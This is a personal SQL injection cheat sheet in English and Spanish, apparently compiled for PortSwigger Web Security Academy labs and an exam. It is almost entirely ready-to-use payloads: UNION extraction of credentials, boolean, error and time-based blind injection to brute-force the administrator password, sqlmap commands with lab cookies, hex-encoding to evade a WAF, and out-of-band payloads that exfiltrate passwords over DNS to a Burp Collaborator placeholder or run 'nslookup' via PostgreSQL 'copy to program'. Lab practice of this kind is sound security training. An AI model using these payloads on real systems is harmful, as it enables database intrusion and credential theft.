Payloads:
```
' order by 10-- -

' union select group_concat(schema_name) from information_schema.schemata-- -

' union select group_concat(table_name) from information_schema.tables where table_schema='nombre'-- -

' union select group_concat(column_name) from information_schema.columns where table_name='nombre'-- -

' union select group_concat(user,pass) from db.table'-- -

' UNION SELECT username_bvwtof || '~' || password_qbbxtg,'KEH' FROM users_tbmogf-- -
```

PortSwigger cheat sheet:
https://portswigger.net/web-security/sql-injection/cheat-sheet

Oracle :
```
Identufy Oracle:
'||(SELECT '')||' -> error
'||(SELECT '' FROM dual)||' -> valid
 
UNION SELECT NULL,NULL FROM dual-- (because dual is a table we knoe in oracle)

'+UNION+SELECT+table_name,NULL+FROM+all_tables--

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--

'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--

sqlmap -u 'https://0a6d00360460e7dd8187719900d200c5.web-security-academy.net/filter?category=Tech+gifts' -p category --sql-query "SELECT USERNAME_LASZLI, PASSWORD_GLJIEZ FROM PETER.USERS_NYXISJ"
```

SQLMAP options
```
magia =  sqlmap -u "https://<exam-url>/searchadvanced?searchTerm=1*&organizeby=DATE&blog_artist=" --
cookie="_lab=<change-me>; session=<change-me>" --batch --risk 3 --level 5 --dbms=postgresql --dbs

sqlmap -u '' --cookie='' --random-agent -p order --level 5 --risk 1 --batch --dbms='postgresql'



-u url (to get database type)
--dbs (to get database name)
-D 'x' --tables (to get table names)
-D 'x' -T 'y' --columns (to get column names)
--sql-query "SELECT 'z' FROM 'y':'x' WHERE..."


Cookies:
sqlmap -u 'https://0a1f00dd030c941881478ad000eb009a.web-security-academy.net/' --cookie='TrackingId=WKeIOdvGpLvJVfLQ; session=cmJ9qZmmemaKrj2qg5qFXZOFVNF3D8eo' -p TrackingId --level 2 
```

Conditional Responses test:
```
Welcome message appears if rows are returned:

TrackingId=Wh80UOwUs6kA9B53'AND+1=2--+- (Welcome Back message disappears)
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
Check passw length:
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
Brute force password:
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
...
You can also cluster bomb it
```

Conditional error test:
```
' -> error
'' -> no error
'||(SELECT '')||' -> error
'||(SELECT '' FROM dual)||' -> no error (Oracle)
'||(SELECT '' FROM not-a-real-table)||' -> error
Check if a database exists (users in this case):
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

Test if you can controll errors, if the condition is true, show error:
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' -> error
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' -> no error

test if user administrator exists:
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -> error recieved, therefore there is a user administrator

password length:
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

password brute force cluster bomb first number and a-z:
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

```

Visible errors tests:
```
Use CAST to check a query against a boolean:

' -> error with SQL query displayed
'-- -> no error
' AND CAST((SELECT 1) AS int)-- -> AND must be boolean
' AND 1=CAST((SELECT 1) AS int)-- -> no error
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -> username administrator displayed
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -> password for admin displayed
```

Postgre blind:
blinds:https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1
```
'||pg_sleep(10)--
';SELECT pg_sleep(5);--
Time delays, use sqlmap or CASE:
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
cluster bomb
```

Out Of Band Blind **(Union select ...)** REQUIERED UNIOOOOOOOOOOOON!
```
 Oracle 	

(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

The following technique works on fully patched Oracle installations, but requires elevated privileges:
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
Microsoft 	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
PostgreSQL 	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
MySQL 	

The following techniques work on Windows only:
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'

```


DNS lookup with data exfiltration
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
Microsoft 	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
PostgreSQL 	create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
MySQL 	The following technique works on Windows only:
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

XML encoding SQL Injection
Extension = Hackvertor
Try in diferent entities of the body
```
UNION SELECT NULL -> attack detected

xml encoding via hex entity of hackvertor extension
<@hex_entities>UNION SELECT NULL<@/hex_entities>
<@hex_entities>UNION SELECT schema_name FROM information_schema.schemata<@/hex_entities>
<@hex_entities>UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'<@/hex_entities>
<@hex_entities>UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'<@/hex_entities>
<@hex_entities>UNION SELECT password FROM public.users WHERE username='administrator'<@/hex_entities></storeId>
```


SACA EL WIJI XELI
```
'-- -
''
' SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
' UNION SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
'; SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--+-
'; SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--+-
' AND 1 = (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)--+-
' OR 1 = (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)--+-
'; OR 1 = (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)--+-
'; AND 1 = (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)--+-
' SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
' UNION SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
'; SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')

' SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
'; SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--+-
'; SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--+-
' AND 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--+-
' OR 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--+-
'; OR 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--+-
'; AND 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--+-
' SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
' UNION SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
'; SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')
' dbms_pipe.receive_message(('a'),20)--+-
' OR dbms_pipe.receive_message(('a'),20)--+-
' AND dbms_pipe.receive_message(('a'),20)--+-
' SELECT dbms_pipe.receive_message(('a'),20)--+-
'; SELECT dbms_pipe.receive_message(('a'),20)--+-
' UNION SELECT dbms_pipe.receive_message(('a'),20)--+-
LIMIT (SELECT dbms_pipe.receive_message(('a'),20))--+-
' WAITFOR DELAY '0:0:20'--+-
'; SELECT WAITFOR DELAY '0:0:20'--+-
' UNION WAITFOR DELAY '0:0:20'--+-
' AND WAITFOR DELAY '0:0:20'--+-
' OR WAITFOR DELAY '0:0:20'--+-
LIMIT SELECT(WAITFOR DELAY '0:0:20')--+-
'SELECT pg_sleep(20)--+-
'||pg_sleep(20)--+-
'; SELECT pg_sleep(10)--+-
'||pg_sleep(10)--+-
';UNION SELECT pg_sleep(10)--+-
LIMIT (SELECT+pg_sleep(20))--+-
'SELECT SLEEP(20)--+-
'||SLEEP(20)--+-
';SELECT SLEEP(20)--+-
'UNION+SELECT SLEEP(20)--+-
LIMIT (SELECT SLEEP(20))--+-
'UNION+SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual'--+-
'SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual--+-
';SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual--+-
LIMIT (SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual)--+-
'IF (1=1) WAITFOR DELAY '0:0:20'--+-
'SELECT IF (1=1) WAITFOR DELAY '0:0:20'--+-
'; SELECT IF (1=1) WAITFOR DELAY '0:0:20'--+-
'UNION SELECT IF (1=1) WAITFOR DELAY '0:0:20'--+-
LIMIT (SELECT IF (1=1) WAITFOR DELAY '0:0:20')--+-
'SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END--+-
';SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END--+-
'UNION SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END--+-
LIMIT (SELECT CASE WHEN (1=1) THEN pg_sleep(20) ELSE pg_sleep(0) END)--+-
'SELECT IF(1=1,SLEEP(20),'a')--+-
'UNION+SELECT IF(1=1,SLEEP(20),'a')--+-
';SELECT IF(1=1,SLEEP(20),'a')--+-
LIMIT (SELECT IF(1=1,SLEEP(20),'a'))--+-
```

Try collaborator:
```
' SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--+-
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--+-
' SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')--+-
' UNION SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')--+-

' exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--+-
' UNION exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--+-
' UNION SELECT exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--+-
' SELECT exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--+-
' copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--+-
' UNION SELECT copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--+-
' SELECT copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--+-
'LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--+-
' SELECT LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--+-
' UNION SELECT LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--+-
```


tests
si se te va la flapa:
https://github.com/payloadbox/sql-injection-payload-list/tree/master/Intruder/detect
```
# from wapiti
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
'\"
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+benchmark(3200,SHA1(1))+'
+ SLEEP(10) + '
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 

```